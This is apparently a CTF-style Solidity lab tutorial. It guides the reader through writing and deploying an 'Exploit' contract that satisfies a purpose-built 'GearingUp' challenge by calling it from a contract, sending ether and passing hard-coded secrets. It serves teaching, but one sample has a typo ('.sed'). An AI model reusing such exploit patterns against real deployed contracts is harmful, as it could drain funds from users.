Gearing up for every heist is very important, not only every heist has their own unique problem that you need to tackle, but sometimes doing the work manually won't do the job. So what about creating the perfect tools or assistant for every heist?

In this lab, you are going to create your first ever exploit contract to solve the lab. what? Kinda confused about how to do it? We'll guide you! &nbsp;  
&nbsp;

## Writing The Prerequisite Exploit
Now that we have everything that we need in the */src*, we can start writing the code. First of all we want to import the contract that we are going to exploit. &nbsp;  
&nbsp;  

```solidity
pragma solidity ^0.8.26;

import "./Setup.sol";
import "./GearingUp.sol";

contract Exploit{

}
```
&nbsp;  
After we import the contracts, we can now make a variable that will reference a contract instance. For this, we need to know the *Contract Name*, this name is defined after the keyword *contract*. To refer to both *Setup* and *GearingUp* with their respective deployed addresses, we can do this! &nbsp;  
&nbsp;  

```solidity
contract Exploit{
    Setup public setup;            // You can do this
    GearingUp public immutable GU; // or this is also fine

    constructor(address _setup) {
        setup = Setup(_setup);
        GU = GearingUp(setup.GU());
    }
}
```
&nbsp;  
You can see above that we can put the address of *Setup* into the constructor and get the address of *Gearing Up* from calling the *GU()* variable from the Setup contract. If you don't want to do that, you can add another input of address in the constructor to add the *Gearing Up* address just like the setup.
&nbsp;  
&nbsp;
## Writing The Exploit
Now before writing the contract, let's analyze the code, what do we need to make the *Setup::isSolved()* returns true.
&nbsp;  
&nbsp;  
1. *GearingUp::callOne()* must be *True*
2. *GearingUp::depositOne()* must be *True*
3. *GearingUp::withdrawOne()* must be *True*
4. *GearingUp::sendData()* must be *True*
5. *GearingUp::allFinished()* must be *True*

&nbsp;  
The *Gearing Up* contract on deployed has 10 Ether, we can see that on the constructor that it required 10 Ether to be deployed. Now that we know what we've got to do, let's start analyzing and writing the exploit.
&nbsp;  
&nbsp;
### Calling a Function
We are going to make *GearingUp::callOne()* return true first, let's see the code.&nbsp;  
&nbsp;  

```solidity
    function callThis() public{
        // verify that a smart contract is calling this.
        require(msg.sender != tx.origin);
        callOne = true;
    }
```
&nbsp;  
It compares the *msg.sender* value with the *tx.origin*. We know from the *briefing* that *msg.sender* can be either EOA or Smart Contract, but tx.origin will always be an EOA, so to solve this we need to call the function using a Smart Contract, in this case our Exploit Contract. We can call the function by implementing this in our Smart Contract. &nbsp;  
&nbsp;  

```solidity
function solveGearingUp() public {
    GU.callThis(); // Calling function
}
```
&nbsp;  
running the *Exploit::solveGearingUp()* will call the *GearingUp::callOne()* returns true now.
&nbsp;  
&nbsp;
### Sending & Receiving Ether
Smart Contract can also send another Smart Contract Ether, but do take note that we are doing this with the Solidity version of *0.8.0*, in another version, a different code needs to be implemented, such as in *0.6.0*. Before going there, let's learn about the 3 ways of transferring Ether in Solidity. We have the *transfer(ether_value)*, *send(ether_value)*, and *call(ether_value, data)*. So, what's the difference? &nbsp;   
&nbsp;  
- *transfer*
    &nbsp;  
    *Transfer* only uses 2300 gas and will throw an error upon failure, however, this function is no longer recommended for sending Ether. &nbsp;  
    &nbsp;  

    ```solidity
    // 0.8.0
    function sendingEther(address payable _to) public payable{
        _to.transfer(msg.value);
    }
    ```
&nbsp;   
- *send*
    &nbsp;  
    Just like transfer, *send* also has the gas limit of 2300, but it won't revert on failure since it returns bool, so we need to check whether the *send* is successful or not. &nbsp;  
    &nbsp;  

    ```solidity
    // 0.8.0
    function sendingEther(address payable _to) public payable{
        (bool sent) = address(_to).sed(msg.value);
        require(sent, "Failed to send Ether!");
    }
    ```
&nbsp;  
- *call*
    &nbsp;  
    *call* is by far the most recommended method of transferring Ether. It has no limit on how much gas it uses, but it doesn't revert on failure since it's also return bool. &nbsp;  
    &nbsp;  

    ```solidity
    // 0.8.0
    function sendingEther(address payable _to) public payable{
        (bool sent, bytes memory data) = _to.call{value: msg.value}("");
        require(sent, "Failed to send Ether!");
    }
    ```
    &nbsp;   
    Here is also an example of the implementation of *call* in the earlier version of *0.6.0*. &nbsp;  
    &nbsp;  

    ```solidity
    // 0.6.0
    function sendingEther(address payable _to) public payable{
        (bool sent, bytes memory data) = _to.call.value(msg.value)("");
        require(sent, "Failed to send Ether!");
    }
    ```
&nbsp;   
Let's see what we have to deal with to make the *GearingUp::depositOne()* return true. &nbsp;  
&nbsp;  

```solidity
    function sendMoneyHere() public payable{
        require(msg.sender != tx.origin);
        require(msg.value == 5 ether);
        depositOne = true;
    }
```
&nbsp;   
As usual, the first check always checks whether the *msg.sender* is an EOA or not, but the second one ensures that the *msg.value*, or the amount of Ether sent to the function is *5 Ether*. Let's talk about the word *payable* and how Smart Contract Receives Ether first. There are 2 main ways a smart contract can "receive ether."
&nbsp;  
&nbsp;  
- *payable* function
    &nbsp;  
    We can add the word *payable* at the end of the function declaration to make the function able to receive ether. We can see that in the *GearingUp::Constructor()* and *GearingUp::sendMoneyHere()*, with the *payable* function, we can send them some ether. In REMIX, when compile the GearingUp and deploy it, you will notice that the *Deploy* button and *sendMoneyHere* are red, indicating that it is a *payable* function. By adding the *payable* function, you also unlock the *msg.value* global attribute, indicating the amount of Ether (in wei) sent with the transaction.
&nbsp;  
&nbsp;  
- *receive()* and *fallback()*
    &nbsp;  
    While making your constructor payable only gives the contract the ability to receive Ether upon deployment, adding *receive()* or *fallback()* allows your contract to receive Ether at any given moment. However, we need to understand the difference between them. &nbsp;  
    &nbsp;  

    ```text
                       send Ether
                    |
            msg.data is empty?
               /          \
             yes           no
            /               \
     receive() exists?     fallback()
         /     \
        yes     no
       /         \
  receive()   fallback()
  ```
    &nbsp;  
    depending on what your smart contract needs, you can either implement one or both of them. Here is an example of implementation. &nbsp;  
    &nbsp;  
    ```solidity
    receive() external payable{
        // some logic here if needed
    }

    fallback() external payable{
        // some logic here if needed
    }
    ```
&nbsp;  
Not that we already have the knowledge, let's implement the code to make *GearingUp::depositOne()* and *GearingUp::withdrawOne()* return true. &nbsp;  
&nbsp;  

```solidity
function solveGearingUp() public payable{
    GU.callThis();
    GU.sendMoneyHere{value: msg.value}(); // ensure that msg.value == 5
    GU.withdrawReward(); // Take Reward
}

receive() external payable{}
```
&nbsp;  
That is one way of sending the Ether since the &*GearingUp::sendMoneyHere()* is a payable function, but since our contract didn't have Ether, we need to make *Exploit::solveGearingUp()* become a *payable* function by adding the word *payable* there. If you wish to give the contract some balance first is also fine, we can modify the contract to receive an Ether upon deployment and send the amount later when calling the *solveGearingUp()*. &nbsp;  
&nbsp;  

```solidity
contract Exploit{

    constructor(...) payable{
        require(msg.value == 5 ether);
        ...
    }

    function solveGearingUp() public{
        ...
    }
}
```
&nbsp;  
### Sending Data 
Smart Contract can also be used to send data. Just like the function *GearingUp:sendSomeData()*, you are going to send a *string*, *uint256*, *bytes*, and *address*. Let's see the if logic. &nbsp;  
&nbsp;  

```solidity
    function sendSomeData(string memory password, uint256 code, bytes4 fourBytes, address sender) public{
        if(
            keccak256(abi.encodePacked(password)) == keccak256(abi.encodePacked("GearNumber1")) &&
            code == 687221 &&
            keccak256(abi.encodePacked(fourBytes)) == keccak256(abi.encodePacked(bytes4(0x1a2b3c4d))) &&
            sender == msg.sender
        ){
            sendData = true;
        }
    }
```
&nbsp;  
You might wonder now why we use hash comparison and why not directly compare the input and the values (bytes and string), Solidity can't do that, hence that logic above is implemented. Okay, let's write the code now. &nbsp;  
&nbsp;  

```solidity
function solveGearingUp() public payable{
    GU.callThis();
    GU.sendMoneyHere{value: msg.value}();
    GU.withdrawReward(); 
    // Send the required data
    GU.sendSomeData("GearNumber1", 687221, 0x1a2b3c4d, address(this));
}
```
&nbsp;  
Oh yeah, the *address(what)* is to fulfill the 4th requirement, since it compares that the value of *address sender* is equal with *msg.sender* (our smart contract), we must put our address there. In another case, when you need to parse a payable address, you can use *payable(address(this))*.
&nbsp;  
&nbsp;
### Finishing Up & Deploying Exploit
Now that we have our Exploit for every function, we just need to call *GearingUp::completedGearing()* to make the *Setup::isSolved()* return true and solve the lab. Here is our final Exploit with the Ether send on the attack. &nbsp;  
&nbsp;  
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import "./Setup.sol";
import "./GearingUp.sol";

contract Exploit{
    Setup public setup;
    GearingUp public immutable GU;

    constructor(address _setup){
        setup = Setup(_setup);
        GU = GearingUp(setup.GU());
    }

    function solveGearingUp() public payable{
        require(msg.value == 5 ether);
        GU.callThis();
        GU.sendMoneyHere{value: msg.value}();
        GU.sendSomeData("GearNumber1", 687221, 0x1a2b3c4d, address(this));
        GU.withdrawReward();
        GU.completedGearingUp();
    }

    receive() external payable { }

}
```
&nbsp;  
To deploy the exploit, we can use this command below on the root of your project folder. &nbsp;  
&nbsp;  

```bash
forge create src/gearing-up/Exploit.sol:Exploit -r $RPC_URL --private-key $PK --constructor-args $SETUP_ADDR 
```
&nbsp;  
You can adjust the command to your needs, by doing this, we are deploying our contract to the network. You will see *Deployer*, *Deployed to*, and *Transaction Hash*, your contract is now deployed with an address of *Deployed To*. To finish up and solve the lab, let's call our *solveGearingUp()*. &nbsp;  
&nbsp;  

```bash
cast send -r $RPC_URL --private-key $PK $EXPLOIT_ADDR "solveGearingUp()" --value 5ether
```
&nbsp;  
Here is another version of the Exploit contract, this one will require you to include the Ether on the deployment instead when calling them, like the last version of the contract. &nbsp;  
&nbsp;  
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import "./Setup.sol";
import "./GearingUp.sol";

contract Exploit{
    Setup public setup;
    GearingUp public immutable GU;

    constructor(address _setup) payable {
        require(msg.value == 5 ether);
        setup = Setup(_setup);
        GU = GearingUp(setup.GU());
    }

    function solveGearingUp() public {
        GU.callThis();
        GU.sendMoneyHere{value: 5 ether}();
        GU.sendSomeData("GearNumber1", 687221, 0x1a2b3c4d, address(this));
        GU.withdrawReward();
        GU.completedGearingUp();
    }

    receive() external payable { }

}
```
&nbsp;  

### Deploying using the Test

To deploy the Exploit Contract using the Test File, first you need to import the contract, let's assume you write the exploit contract at `/src/gearing-up/exploit.sol`, then you need to import the file correctly like

```solidity
import {Exploit} from "src/Basic/gearing-up/exploit.sol";
```

To then deploy it, you can do this below the `//Write your exploit here`

```solidity
    // if the constructor isn't payable
    Exploit exp = new Exploit(address(challSetup));

    // if the constructor is payable
    Exploit exp = new Exploit{value: 5 ether}(address(challSetup));
```

The rest, you just need to call the exploit like what you did in Briefing.